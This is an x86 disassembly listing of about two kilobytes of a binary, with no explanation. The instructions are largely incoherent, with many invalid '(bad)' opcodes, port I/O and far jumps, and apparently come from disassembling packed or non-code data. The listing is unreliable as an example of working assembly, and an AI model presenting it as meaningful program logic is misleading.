  415635:	mov    ebx,0xb8022fb4
  41563a:	xor    al,0x58
  41563c:	pandn  mm3,QWORD PTR [ebx]
  41563f:	pop    esp
  415640:	or     BYTE PTR [eax-0x1f16706a],ch
  415646:	xor    BYTE PTR [ebx],ch
  415648:	(bad)  
  415649:	call   0x7ff80a2f
  41564e:	mov    ds:0x2de7c86b,al
  415653:	nop
  415654:	jle    0x4155e8
  415656:	imul   ebx,edx,0x9
  415659:	(bad)  
  41565a:	stc    
  41565b:	outs   dx,DWORD PTR ds:[esi]
  41565c:	push   edi
  41565d:	pop    ds
  41565e:	stos   DWORD PTR es:[edi],eax
  41565f:	mov    bl,0xd
  415661:	das    
  415662:	(bad)  [eax]
  415664:	cmova  eax,DWORD PTR [ecx+0x2f]
  415668:	sti    
  415669:	jmp    0xaa21182
  41566e:	inc    edx
  41566f:	fisubr DWORD PTR [edi-0x48]
  415672:	mov    edx,DWORD PTR [eax-0x74]
  415675:	dec    ebx
  415676:	rcl    BYTE PTR [ecx+0x5c5512c2],1
  41567c:	rol    al,0xb2
  41567f:	mov    cs:0x6d7c942,al
  415685:	loope  0x4156fe
  415687:	scas   al,BYTE PTR es:[edi]
  415688:	dec    edi
  415689:	int3   
  41568a:	(bad)  
  41568b:	lea    ebx,[edx-0x60ef1fd7]
  415691:	fidiv  WORD PTR [ebp+0x4d8cf8b4]
  415697:	pop    ebp
  415698:	jbe    0x41570b
  41569a:	sub    al,0xc6
  41569c:	and    ch,0xdb
  41569f:	jns    0x4156e1
  4156a1:	dec    ecx
  4156a2:	sbb    edi,DWORD PTR [ecx]
  4156a4:	jle    0x41564c
  4156a6:	retf   0x5b2a
  4156a9:	jg     0x415642
  4156ab:	scas   eax,DWORD PTR es:[edi]
  4156ac:	xor    BYTE PTR [ebx+0xf],cl
  4156af:	jmp    DWORD PTR [eax+0x64]
  4156b2:	loop   0x415684
  4156b4:	fild   WORD PTR [ebp-0x58d0028a]
  4156ba:	fcom   DWORD PTR [esi]
  4156bc:	sub    esi,DWORD PTR [ebx-0x58]
  4156bf:	push   ebp
  4156c0:	test   BYTE PTR [eax+0x332a2030],0x90
  4156c7:	jmp    0x415698
  4156c9:	adc    dh,dl
  4156cb:	xchg   edi,eax
  4156cc:	mov    ebp,0xb83581f7
  4156d1:	icebp  
  4156d2:	xor    DWORD PTR [edx],edi
  4156d4:	and    dl,BYTE PTR [ebx+0x3b67679]
  4156da:	inc    ebx
  4156db:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4156dd:	daa    
  4156de:	inc    eax
  4156df:	pusha  
  4156e0:	sub    al,0xd5
  4156e2:	mov    ecx,0x603d0709
  4156e7:	pop    ss
  4156e8:	dec    edx
  4156e9:	loop   0x415693
  4156eb:	arpl   WORD PTR [ebp+0x160f43f7],si
  4156f1:	enter  0x1de5,0x52
  4156f5:	rol    edi,1
  4156f7:	nop
  4156f8:	aaa    
  4156f9:	lea    ebp,[ecx]
  4156fb:	sahf   
  4156fc:	adc    DWORD PTR [edi+eax*4],0x31
  415700:	push   esp
  415701:	mov    eax,ds:0x372f133f
  415706:	aaa    
  415707:	lds    eax,FWORD PTR [eax+0xd29e7ef]
  41570d:	cmp    ebp,DWORD PTR [edi-0x65]
  415710:	adc    DWORD PTR [esi-0x1805c296],ebp
  415716:	cmp    eax,0x14adc1dd
  41571b:	(bad)  
  41571c:	jecxz  0x41573e
  41571e:	add    DWORD PTR [ecx+eiz*2+0x5d],edi
  415722:	add    BYTE PTR [edx],bl
  415724:	fstp   DWORD PTR [ebp-0x1d]
  415727:	popf   
  415728:	cmp    BYTE PTR [ebp+0x277f74c7],al
  41572e:	cmp    DWORD PTR [edi+0x6d403900],0x59c11669
  415738:	xchg   DWORD PTR [ebx+0x45e9da4c],esp
  41573e:	push   ecx
  41573f:	pop    edx
  415740:	je     0x41573a
  415742:	sbb    DWORD PTR ds:[ebx],ebx
  415745:	fst    QWORD PTR [ecx]
  415747:	in     al,0xd1
  415749:	dec    esi
  41574a:	aas    
  41574b:	ja     0x415724
  41574d:	mov    al,0x1f
  41574f:	int    0xf
  415751:	or     al,0x8e
  415753:	sbb    al,0xbc
  415755:	cld    
  415756:	aas    
  415757:	fistp  DWORD PTR [esi+0xd62eb72]
  41575d:	mov    cl,0x8e
  41575f:	push   0xffffffc2
  415761:	(bad)
  415766:	icebp  
  415767:	cmc    
  415768:	cdq    
  415769:	fdiv   st(0),st
  41576b:	cmp    eax,0x69bdff9d
  415770:	shl    BYTE PTR [ebx-0x521890e0],cl
  415776:	push   ss
  415777:	icebp  
  415778:	fimul  WORD PTR [ebp+eax*1-0x72d3611d]
  41577f:	add    dl,BYTE PTR [ebx+eiz*8+0x17734543]
  415786:	xchg   edx,eax
  415787:	and    eax,0x5c52b86b
  41578c:	xchg   esi,eax
  41578d:	ins    BYTE PTR es:[edi],dx
  41578e:	cmp    eax,0x42b93ad6
  415793:	or     BYTE PTR [ecx],dh
  415795:	test   al,0x99
  415797:	aad    0xa7
  415799:	or     DWORD PTR [ebx-0x211af17c],ebx
  41579f:	xor    edi,DWORD PTR [ebx+edi*2]
  4157a2:	xor    DWORD PTR [edx-0x50],ecx
  4157a5:	inc    ebp
  4157a6:	fucomp st(0)
  4157a8:	pusha  
  4157a9:	imul   ecx,eax,0xffffffa5
  4157ac:	sar    DWORD PTR [edi+0x28],cl
  4157af:	dec    esp
  4157b0:	repnz push edi
  4157b2:	jbe    0x4157f4
  4157b4:	cdq    
  4157b5:	test   DWORD PTR [ebx],esp
  4157b7:	mov    dl,BYTE PTR [edi-0x7b]
  4157ba:	dec    edx
  4157bb:	add    eax,0x34eca696
  4157c0:	and    bl,BYTE PTR [ecx-0x1ae0ba95]
  4157c6:	stc    
  4157c7:	aad    0xa0
  4157c9:	push   0x1e337e2c
  4157ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157cf:	mov    edi,0x830ed897
  4157d4:	pop    ecx
  4157d5:	jle    0x4157e1
  4157d7:	leave  
  4157d8:	sbb    bl,dh
  4157da:	dec    edi
  4157db:	sub    esi,DWORD PTR [edx+0xc]
  4157de:	fsubr  st,st(0)
  4157e0:	or     al,0x86
  4157e2:	dec    eax
  4157e3:	or     al,0x12
  4157e5:	jo     0x4157be
  4157e7:	dec    ebp
  4157e8:	push   es
  4157e9:	test   al,0xb2
  4157eb:	fld    TBYTE PTR [ebx]
  4157ed:	mov    edx,0x313ea7d9
  4157f2:	jle    0x4157ac
  4157f4:	push   es
  4157f5:	xchg   ebp,eax
  4157f6:	xor    eax,0x11075992
  4157fb:	mul    edx
  4157fd:	jmp    0x83a1:0xeb90e2c4
  415804:	inc    edi
  415805:	push   cs
  415806:	outs   dx,BYTE PTR ds:[esi]
  415807:	push   edi
  415808:	xchg   edi,eax
  415809:	ja     0x415844
  41580b:	mov    ?,WORD PTR [ecx-0x4e86072e]
  415811:	hlt    
  415812:	lahf   
  415813:	or     ebx,DWORD PTR [eax+eiz*2]
  415816:	xchg   eax,esi
  415818:	xor    BYTE PTR [edi],ah
  41581a:	loop   0x415813
  41581c:	inc    ecx
  41581d:	adc    eax,0xf8b42185
  415822:	cs mov ah,0x6a
  415825:	push   es
  415826:	jmp    0x415846
  415828:	jecxz  0x4157f0
  41582a:	cmp    DWORD PTR [ebp-0x56],esp
  41582d:	and    dh,BYTE PTR [edi+0x6e99038d]
  415833:	mov    bl,0x7c
  415835:	(bad)  
  415837:	mov    al,ds:0xce993e2d
  41583c:	pop    ss
  41583d:	es or  ebp,0x7d9e2419
  415844:	jnp    0x41589c
  415846:	(bad)  
  415847:	cmp    DWORD PTR [ebp-0x585891b3],edi
  41584d:	mov    ds:0xd4a7d068,eax
  415852:	push   esi
  415853:	cli    
  415854:	scas   al,BYTE PTR es:[edi]
  415855:	inc    ecx
  415856:	push   0xccc3c9c5
  41585b:	cwde   
  41585c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41585d:	mov    ch,0x68
  41585f:	mov    esi,0x16609eff
  415864:	xchg   ebx,eax
  415865:	outs   dx,BYTE PTR ds:[esi]
  415866:	xor    eax,0xebeb53fd
  41586b:	jbe    0x415863
  41586d:	fist   WORD PTR [edi+0x3bc6897a]
  415873:	pusha  
  415874:	jle    0x415851
  415876:	scas   eax,DWORD PTR es:[edi]
  415877:	xor    esp,DWORD PTR [ecx]
  415879:	and    esi,DWORD PTR [si]
  41587c:	into   
  41587d:	jb     0x415824
  41587f:	clc    
  415880:	loope  0x4158b6
  415882:	sub    bh,BYTE PTR [ebp+0x2b]
  415885:	mov    dh,BYTE PTR ds:0x40ea532a
  41588b:	adc    dl,BYTE PTR [eax+0x51]
  41588e:	int3   
  41588f:	int    0x39
  415891:	ret    0x93a0
  415894:	(bad)  
  415895:	mov    eax,0xd87b16b4
  41589a:	mov    dl,0x6b
  41589c:	div    DWORD PTR [eax]
  41589e:	inc    eax
  41589f:	leave  
  4158a0:	out    dx,al
  4158a1:	pop    ebp
  4158a2:	sub    al,0xc3
  4158a4:	mul    DWORD PTR [edi+eax*2+0xf7bee2d]
  4158ab:	ins    DWORD PTR es:[edi],dx
  4158ac:	xchg   edi,eax
  4158ad:	test   esi,ecx
  4158af:	push   es
  4158b0:	xor    edx,DWORD PTR [esp+ebp*8]
  4158b3:	mov    DWORD PTR [esi-0x29723942],esi
  4158b9:	inc    esp
  4158ba:	or     cl,cl
  4158bc:	lea    eax,[ecx]
  4158be:	xchg   ecx,eax
  4158bf:	lods   al,BYTE PTR ds:[esi]
  4158c0:	inc    esp
  4158c1:	mov    DWORD PTR [ecx-0x3ec8d01c],0xd0d8268a
  4158cb:	mov    eax,ds:0x6e729cc3
  4158d0:	shr    BYTE PTR [eax-0x80],0x52
  4158d4:	idiv   DWORD PTR [eax]
  4158d6:	lock mov esi,0xe356ffad
  4158dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158dd:	cwde   
  4158de:	mov    ds:0x35a3a04f,al
  4158e3:	sbb    eax,0xe2c883d2
  4158e8:	sbb    DWORD PTR [edx+0x46],esi
  4158eb:	jg     0x4158af
  4158ed:	arpl   WORD PTR [ebx],bx
  4158ef:	add    bh,ch
  4158f1:	mov    ds:0xbb0674a2,al
  4158f6:	mov    ch,0x8d
  4158f8:	mov    edi,0x549eb799
  4158fd:	retf   
  4158fe:	jmp    0xb10f3fc
  415903:	cs enter 0x1412,0xa
  415908:	inc    esp
  415909:	ins    BYTE PTR es:[edi],dx
  41590a:	adc    edx,DWORD PTR [esp+ecx*2-0x40]
  41590e:	mov    ds:0x7a8b0f39,eax
  415913:	jp     0x41591e
  415915:	btc    DWORD PTR [esi+edi*4],edx
  415919:	adc    al,0x4a
  41591b:	out    0x42,eax
  41591d:	mov    ds:0x12e0d7ce,al
  415922:	mov    DWORD PTR [ecx-0x66],ebx
  415925:	or     edi,DWORD PTR [eax+0x74fb98d3]
  41592b:	xchg   edx,eax
  41592c:	cs daa 
  41592e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41592f:	clc    
  415930:	mov    cl,BYTE PTR [edi+0x68320138]
  415936:	repnz cmp ch,BYTE PTR [ebp+0x6]
  41593a:	pop    eax
  41593b:	sbb    eax,DWORD PTR fs:[esi]
  41593e:	pop    ecx
  41593f:	mov    dh,0x31
  415941:	popa   
  415942:	nop    esi
  415945:	push   ecx
  415946:	mov    dl,0x92
  415948:	xor    esi,ecx
  41594a:	lods   eax,DWORD PTR ds:[esi]
  41594b:	retf   0xd1ba
  41594e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41594f:	cmp    BYTE PTR [edi+0x1],0x76
  415953:	fdivp  st(3),st
  415955:	test   al,0x1c
  415957:	mov    esi,DWORD PTR [ebx+ebp*1+0x67]
  41595b:	out    dx,eax
  41595c:	imul   esp,ecx,0x177581a5
  415962:	sbb    BYTE PTR [edx+esi*8-0x1],al
  415966:	imul   ebx,DWORD PTR [ecx+0x534655b],0x2da05f83
  415970:	call   0x425e4a65
  415975:	clc    
  415976:	mov    esp,0xe4b6e0d9
  41597b:	dec    ebp
  41597c:	repz jnp 0x41590d
  41597f:	cdq    
  415980:	imul   ecx,DWORD PTR [esi],0x3dcff29c
  415986:	jo     0x41595b
  415988:	daa    
  415989:	xlat   BYTE PTR ds:[ebx]
  41598a:	scas   al,BYTE PTR es:[edi]
  41598b:	aad    0xef
  41598d:	jmp    DWORD PTR [ebp+0x49]
  415990:	xchg   edx,eax
  415991:	(bad)  
  415992:	repz (bad) 
  415994:	fidiv  WORD PTR [eax]
  415996:	fwait
  415997:	pop    ebx
  415998:	cwde   
  415999:	xchg   ebx,eax
  41599a:	outs   dx,BYTE PTR ds:[esi]
  41599b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41599c:	call   0x917609df
  4159a1:	push   esp
  4159a2:	mov    WORD PTR [esi],ss
  4159a4:	push   esi
  4159a5:	enter  0x688b,0x47
  4159a9:	js     0x415941
  4159ab:	mov    eax,0x36768a49
  4159b0:	(bad)  
  4159b1:	inc    eax
  4159b2:	mov    edi,0x72b852f3
  4159b7:	aas    
  4159b8:	lods   eax,DWORD PTR gs:[esi]
  4159ba:	dec    edx
  4159bb:	xchg   edi,eax
  4159bc:	fs (bad) 
  4159be:	xor    ecx,esp
  4159c0:	adc    eax,DWORD PTR [eax]
  4159c2:	inc    edi
  4159c3:	sbb    eax,DWORD PTR [esi+0x5f]
  4159c6:	jmp    0x39256427
  4159cb:	sbb    al,BYTE PTR [ebp+0x43]
  4159ce:	adc    BYTE PTR [eax],ch
  4159d0:	sbb    edi,DWORD PTR ds:0x27827c45
  4159d6:	in     eax,0x78
  4159d8:	jo     0x4159ef
  4159da:	jns    0x415a25
  4159dc:	sbb    DWORD PTR [ebx+eiz*2-0x6],ecx
  4159e0:	push   esp
  4159e1:	loope  0x415a27
  4159e3:	mov    WORD PTR [edx+edi*1-0x41d0a512],gs
  4159ea:	stos   BYTE PTR es:[edi],al
  4159eb:	sahf   
  4159ec:	and    eax,0xa4917971
  4159f1:	(bad)  
  4159f2:	jno    0x4159e9
  4159f4:	cld    
  4159f5:	(bad)  [esi-0x7f47d8d]
  4159fb:	in     al,dx
  4159fc:	shl    edi,1
  4159fe:	push   ebx
  4159ff:	stc    
  415a00:	rol    DWORD PTR [edx+0x4c],0xc5
  415a04:	push   edi
  415a05:	cs add al,0xc5
  415a08:	sub    al,0xa1
  415a0a:	imul   ebx,DWORD PTR [edi],0x40eb6042
  415a10:	push   ecx
  415a11:	dec    eax
  415a12:	pop    edi
  415a13:	das    
  415a14:	push   edi
  415a15:	push   eax
  415a16:	fs pushf 
  415a18:	lods   eax,DWORD PTR ds:[esi]
  415a19:	xchg   ebp,eax
  415a1a:	jmp    0x415a90
  415a1c:	pop    es
  415a1d:	int    0xd8
  415a1f:	out    0x37,al
  415a21:	sbb    BYTE PTR [esi-0xb],0xaf
  415a25:	pop    ebx
  415a26:	mov    edi,0x57b74277
  415a2b:	adc    BYTE PTR [edx+0x1a],0x4d
  415a2f:	test   eax,0x8780c5a6
  415a34:	mov    dh,ah
  415a36:	sub    bh,BYTE PTR [ecx+0x7fa4fa1f]
  415a3c:	cmp    al,dh
  415a3e:	(bad)  
  415a3f:	jae    0x4159ef
  415a41:	dec    eax
  415a42:	jp     0x415a14
  415a44:	enter  0x8727,0x6
  415a48:	es push ss
  415a4a:	aam    0x76
  415a4c:	aam    0x21
  415a4e:	sar    DWORD PTR [ebx],0xa6
  415a51:	mov    al,0xf4
  415a53:	gs ins DWORD PTR es:[edi],dx
  415a55:	pop    ecx
  415a56:	mov    DWORD PTR [ebp+0x2a],esi
  415a59:	add    bh,cl
  415a5b:	enter  0xf0fc,0x2a
  415a5f:	sub    BYTE PTR ds:0x2923327e,cl
  415a65:	cwde   
  415a66:	inc    eax
  415a67:	cmp    ch,BYTE PTR ds:0x579c2d36
  415a6d:	stos   DWORD PTR es:[edi],eax
  415a6e:	dec    edx
  415a6f:	lods   al,BYTE PTR ds:[esi]
  415a70:	aas    
  415a71:	jle    0x415a54
  415a73:	dec    ebp
  415a74:	outs   dx,DWORD PTR ds:[esi]
  415a75:	in     eax,dx
  415a76:	add    eax,0x12812f1b
  415a7b:	inc    edx
  415a7c:	sahf   
  415a7d:	pushf  
  415a7e:	cmp    DWORD PTR [ebx],esp
  415a80:	ror    DWORD PTR [edi-0x18],1
  415a83:	ret    0x154
  415a86:	mov    bh,0x56
  415a88:	pop    ds
  415a89:	lods   al,BYTE PTR ds:[esi]
  415a8a:	inc    edi
  415a8b:	imul   ecx,DWORD PTR [ecx+0x1a017659],0xffffffd7
  415a92:	je     0x415ac0
  415a94:	emms   
  415a96:	push   0x19da27fa
  415a9b:	imul   eax,esp,0xffffff8b
  415a9e:	ds pusha 
  415aa0:	pop    ebp
  415aa1:	add    eax,0x7d25b132
  415aa6:	in     al,0xf4
  415aa8:	dec    edx
  415aa9:	pop    ebx
  415aaa:	dec    ecx
  415aab:	(bad)  
  415aac:	loopne 0x415a9b
  415aae:	pop    ecx
  415aaf:	mov    ds:0xb3f137a3,al
  415ab4:	mov    ds:0x2260c46f,al
  415ab9:	sbb    ecx,edi
  415abb:	repz dec eax
  415abd:	aad    0x9f
  415abf:	(bad)  
  415ac0:	add    ebx,DWORD PTR [ebx]
  415ac2:	loop   0x415a7b
  415ac4:	sti    
  415ac5:	cdq    
  415ac6:	lea    ecx,[ecx-0x329f262a]
  415acc:	imul   esi,edi,0x93cd228f
  415ad2:	adc    eax,0x9f283041
  415ad7:	pop    es
  415ad8:	fmul   QWORD PTR [ebp-0x3ea1064]
  415ade:	xor    ecx,DWORD PTR [ecx+0x48]
  415ae1:	xor    BYTE PTR [eax],ah
  415ae3:	mov    al,ds:0xf150ae27
  415ae8:	sbb    ch,BYTE PTR [ebp-0x3a]
  415aeb:	sbb    DWORD PTR [esi+0x257fb248],ebp
  415af1:	stos   BYTE PTR es:[edi],al
  415af2:	jge    0x415b3c
  415af4:	cmp    esi,ecx
  415af6:	jp     0x415a8b
  415af8:	aas    
  415af9:	adc    BYTE PTR ds:0x79377461,cl
  415aff:	out    dx,eax
  415b00:	adc    ebx,DWORD PTR [ebp+0x7b]
  415b03:	out    dx,al
  415b04:	fisub  WORD PTR [edx+0x4c]
  415b07:	xchg   ecx,eax
  415b08:	dec    ebx
  415b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b0a:	lock push edi
  415b0c:	loope  0x415b51
  415b0e:	jmp    0xfeb9:0x50e6d35f
  415b15:	int    0xe7
  415b17:	rcr    BYTE PTR [ebx+0x207569ae],0xe
  415b1e:	jecxz  0x415b8c
  415b20:	or     al,0x57
  415b22:	jmp    0x1cab:0x78439cc7
  415b29:	mov    esp,0xbb30eae3
  415b2e:	out    0x50,al
  415b30:	arpl   WORD PTR [edx],si
  415b32:	cwde   
  415b33:	fwait
  415b34:	mov    DWORD PTR [ecx],ecx
  415b36:	xchg   ebx,eax
  415b37:	ins    BYTE PTR es:[edi],dx
  415b38:	push   ebp
  415b39:	les    esp,FWORD PTR [eax]
  415b3b:	mov    esp,0x45ceaf54
  415b40:	mov    WORD PTR [ebp-0x6],ds
  415b43:	mov    dh,0x52
  415b45:	aas    
  415b46:	and    eax,0x37f2fcb1
  415b4b:	call   DWORD PTR [edx-0x3f3f4b61]
  415b51:	fxch   st(6)
  415b53:	cli    
  415b54:	das    
  415b55:	stc    
  415b56:	sbb    ah,BYTE PTR [esi]
  415b58:	test   BYTE PTR [esi-0x11],bl
  415b5b:	pop    esp
  415b5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b5d:	sti    
  415b5e:	jns    0x415aea
  415b60:	fadd   QWORD PTR ds:0x1cea1340
  415b66:	ins    DWORD PTR es:[edi],dx
  415b67:	pushf  
  415b68:	dec    edi
  415b69:	and    bh,ch
  415b6b:	or     al,0x69
  415b6d:	bound  edi,QWORD PTR [ebx-0x65]
  415b70:	or     eax,0x40f2f480
  415b75:	mov    ebp,0xdcf03822
  415b7a:	sub    edi,DWORD PTR [edi+0x567f820b]
  415b80:	pushf  
  415b81:	jae    0x415bb1
  415b83:	xchg   ch,dh
  415b85:	fld    TBYTE PTR [ecx-0x5493bda8]
  415b8b:	test   eax,0x14d5ba4d
  415b90:	sub    DWORD PTR [esi+0xc310ea3],edx
  415b96:	push   edi
  415b97:	dec    edx
  415b98:	out    0xff,eax
  415b9a:	call   0xd6bb:0xed06ade7
  415ba1:	int    0xe
  415ba3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba4:	cmp    ebx,DWORD PTR [edi-0x55]
  415ba7:	lods   al,BYTE PTR ds:[esi]
  415ba8:	dec    esi
  415ba9:	leave  
  415baa:	xchg   ebx,eax
  415bab:	adc    DWORD PTR [edi],eax
  415bad:	imul   edx,DWORD PTR [esi+0x18],0x5a05fd88
  415bb4:	bound  esp,QWORD PTR [edi]
  415bb6:	(bad)  
  415bb8:	ss jne 0x415bce
  415bbb:	and    DWORD PTR [ecx+0x4],eax
  415bbe:	test   al,0xcb
  415bc0:	adc    DWORD PTR ds:0x251a0dec,ecx
  415bc6:	popa   
  415bc7:	fiadd  WORD PTR [edi+ebx*4+0x65]
  415bcb:	adc    esp,ecx
  415bcd:	ins    BYTE PTR es:[edi],dx
  415bce:	xor    eax,0x25cfdcb
  415bd3:	dec    edx
  415bd4:	es call eax
  415bd7:	ss push es
  415bd9:	and    esp,ebx
  415bdb:	retf   
  415bdc:	adc    DWORD PTR [ebx],ecx
  415bde:	cmp    ch,dh
  415be0:	mov    al,ds:0x67fbf79f
  415be5:	(bad)  
  415be7:	add    ecx,DWORD PTR [edx]
  415be9:	lahf   
  415bea:	sar    BYTE PTR ds:0x83a45adc,0xf2
  415bf1:	outs   dx,DWORD PTR ds:[esi]
  415bf2:	das    
  415bf3:	mov    esp,0xd891c908
  415bf8:	sub    edx,eax
  415bfa:	sbb    al,BYTE PTR [esi]
  415bfc:	sbb    BYTE PTR [ecx+ebx*4-0x48df0be1],cl
  415c03:	ret    0xd863
  415c06:	ja     0x415c5e
  415c08:	out    dx,eax
  415c09:	dec    BYTE PTR [eax+0x72]
  415c0c:	sti    
  415c0d:	inc    ebx
  415c0e:	enter  0x9ddf,0x11
  415c12:	xlat   BYTE PTR ds:[ebx]
  415c13:	call   0x45bbee6b
  415c18:	rol    DWORD PTR [eax],1
  415c1a:	push   edi
  415c1b:	sub    eax,0xea82ce7f
  415c20:	xlat   BYTE PTR ds:[ebx]
  415c21:	fild   DWORD PTR [ebx+0x7d]
  415c24:	cmp    ch,ah
  415c26:	pushf  
  415c27:	cs mov esi,0x7fe69bf0
  415c2d:	fmulp  st(3),st
  415c2f:	leave  
  415c30:	imul   ebp,esi,0x38c52283
  415c36:	push   cs
  415c37:	in     al,0x9a
  415c39:	and    eax,0xe7e67be9
  415c3e:	jbe    0x415c9c
  415c40:	ja     0x415c60
  415c42:	and    edx,esi
  415c44:	xchg   esp,eax
  415c45:	sub    edi,DWORD PTR [ebx+0x61431bf0]
  415c4b:	and    dl,bh
  415c4d:	adc    eax,0xb303b210
  415c52:	pop    edi
  415c53:	add    al,bh
  415c55:	test   al,0xfa
  415c57:	fwait
  415c58:	imul   esp,edx,0x5ecbfd27
  415c5e:	push   eax
  415c5f:	push   edi
  415c60:	and    eax,DWORD PTR [ecx]
  415c62:	dec    ebx
  415c63:	or     eax,0x623fe538
  415c68:	and    eax,0xf06f2943
  415c6d:	in     al,0x6d
  415c6f:	jecxz  0x415ca0
  415c71:	pop    edi
  415c72:	cmp    al,0x3f
  415c74:	js     0x415cba
  415c76:	mov    bh,0xa5
  415c78:	fdivr  DWORD PTR [ebp+0xb]
  415c7b:	mov    edi,0x9f0c4711
  415c80:	fisttp QWORD PTR [esi+0x1f1f97d9]
  415c86:	xchg   BYTE PTR [ebx-0x79e56118],dh
  415c8c:	cmp    DWORD PTR [ebp+esi*1-0x55],0xd4421996
  415c94:	xchg   esi,eax
  415c95:	jp     0x415d0b
  415c97:	fsubrp st(4),st
  415c99:	icebp  
  415c9a:	mov    dh,0x4c
  415c9c:	xor    al,0xf3
  415c9e:	add    al,0xd9
  415ca0:	xchg   edi,eax
  415ca1:	into   
  415ca2:	inc    ebp
  415ca3:	retf   
  415ca4:	jecxz  0x415c49
  415ca6:	jae    0x415d03
  415ca8:	or     al,0x6c
  415caa:	lea    edi,[eax+0x22]
  415cad:	ror    BYTE PTR [ecx],cl
  415caf:	fwait
  415cb0:	push   0x81c3f9f0
  415cb5:	dec    edx
  415cb6:	or     eax,0x4cef255f
  415cbb:	jmp    0x9ad0ca92
  415cc0:	cwde   
  415cc1:	jg     0x415cc2
  415cc3:	or     al,0x7a
  415cc5:	lods   al,BYTE PTR ds:[esi]
  415cc6:	test   eax,0x6f5eb8a2
  415ccb:	(bad)  
  415ccc:	mov    ebp,0x5d328ccb
  415cd1:	jb     0x415cd1
  415cd3:	xchg   esp,eax
  415cd4:	aas    
  415cd5:	add    DWORD PTR [esi+0xefe75f9],ebp
  415cdb:	sti    
  415cdc:	sub    BYTE PTR [eax-0xc],ah
  415cdf:	mov    gs,WORD PTR [ebp+0x3bff5979]
  415ce5:	ja     0x415c90
  415ce7:	clc    
  415ce8:	xor    eax,0x3719d4de
  415ced:	icebp  
  415cee:	xor    BYTE PTR [edi-0x40e9cd99],dl
  415cf4:	xchg   edx,eax
  415cf5:	push   eax
  415cf6:	sbb    BYTE PTR [ebx],0xa5
  415cf9:	in     eax,0x59
  415cfb:	js     0x415c7f
  415cfd:	push   cs
  415cfe:	loop   0x415d53
  415d00:	mov    bl,0x18
  415d02:	jmp    0x5d7a:0x20866aeb
  415d09:	jae    0x415ccc
  415d0b:	pop    ecx
  415d0c:	cld    
  415d0d:	and    BYTE PTR [ebx+eax*4+0x5a],dl
  415d11:	and    eax,0x3321e77
  415d16:	loopne 0x415d7f
  415d18:	mov    eax,ds:0x27871f95
  415d1d:	or     DWORD PTR [ecx+0x2a],edi
  415d20:	stc    
  415d21:	mov    ds:0x7e4fe5db,eax
  415d26:	test   edi,0x4529403b
  415d2c:	mov    esp,0x8d0ddee2
  415d31:	jns    0x415db0
  415d33:	enter  0x58e8,0x10
  415d37:	add    BYTE PTR [edx],bl
  415d39:	cmp    ebx,DWORD PTR [esi]
  415d3b:	dec    edi
  415d3c:	mov    eax,ds:0x66dff00e
  415d41:	test   eax,0xfe524b8d
  415d46:	rcl    BYTE PTR [esi-0x20402a8e],cl
  415d4c:	mov    edi,0x92271b4
  415d51:	and    dl,BYTE PTR fs:[ebx]
  415d54:	mov    edi,0x61120308
  415d59:	push   cs
  415d5a:	shr    bl,1
  415d5c:	loope  0x415d31
  415d5e:	xchg   edi,eax
  415d5f:	jge    0x415d4e
  415d61:	clc    
  415d62:	xor    DWORD PTR [ecx+edx*2+0x7f],edi
  415d66:	inc    ebx
  415d67:	mov    ah,0x82
  415d69:	or     cl,BYTE PTR [edi*2+0x7789dba1]
  415d70:	stos   BYTE PTR es:[edi],al
  415d71:	dec    eax
  415d72:	fnstenv [edi+0x7ddec4c6]
  415d78:	jecxz  0x415d80
  415d7a:	or     al,0x20
  415d7c:	and    al,0x33
  415d7e:	ja     0x415d9a
  415d80:	mov    eax,0xbba28991
  415d85:	scas   al,BYTE PTR es:[edi]
  415d86:	cmp    eax,0x1dcd9012
  415d8b:	nop
  415d8c:	inc    esp
  415d8d:	adc    ebp,ebp
  415d8f:	mov    eax,0x61c7bfb3
  415d94:	pop    ds
  415d95:	push   cs
  415d96:	jno    0x415d78
  415d98:	dec    ebx
  415d99:	add    eax,0x7072a087
  415d9e:	imul   ebx,edi,0xffffffa8
  415da1:	and    al,BYTE PTR [esi-0x37c794da]
  415da7:	test   al,0xa5
  415da9:	lock shr DWORD PTR [edi+0x62],1
  415dad:	jmp    0xd16733cf
  415db2:	inc    edi
  415db3:	and    eax,0xad93002c
  415db8:	mov    bh,0x2a
  415dba:	pop    ecx
  415dbb:	jb     0x415d90
  415dbd:	call   0x5d6d8d5e
  415dc2:	jmp    0x91cc:0xe4903c07
  415dc9:	or     al,BYTE PTR [edi+0x8db7792]
  415dcf:	xor    eax,0x4628a484
  415dd4:	xchg   edx,ecx
  415dd6:	repnz lock lods eax,DWORD PTR ds:[esi]
  415dd9:	push   esp
  415dda:	lods   al,BYTE PTR ds:[esi]
  415ddb:	sbb    al,0x20
  415ddd:	sbb    eax,0x673f4824
  415de2:	cwde   
  415de3:	pop    ebx
  415de4:	fiadd  WORD PTR [edx+0x3316f510]
  415dea:	push   edx
  415deb:	mov    BYTE PTR [ebx-0x446127ff],cl
  415df1:	push   0xffffffe9
  415df3:	cli    
  415df4:	jmp    0x415dce
  415df6:	or     esp,ebp
  415df8:	das    
  415df9:	mov    dl,0x5f
  415dfb:	data16 cs mov dl,0x83
  415dff:	inc    ebx
  415e00:	outs   dx,DWORD PTR ds:[esi]
  415e01:	xchg   edx,eax
  415e02:	ss lock dec ebp
  415e05:	fild   QWORD PTR [esi-0x37]
  415e08:	jmp    0x15b5:0x72e9dead
  415e0f:	ret    0x1ab7
  415e12:	push   esp
  415e13:	sub    eax,0x92116f7d
  415e18:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e1a:	in     eax,0x35
  415e1c:	test   dh,bh
  415e1e:	xchg   ebp,esp
  415e20:	mov    esp,0x8169dcdc
  415e25:	jmp    0x415db6
  415e27:	out    dx,al
  415e28:	ret    0xf0f4
  415e2b:	sub    DWORD PTR [eax],ebp
  415e2d:	dec    edi
  415e2e:	jl     0x415e78
  415e30:	dec    edi
  415e31:	and    DWORD PTR [ebp+ebx*1+0x31467ede],0xd17f78bb
  415e3c:	inc    eax
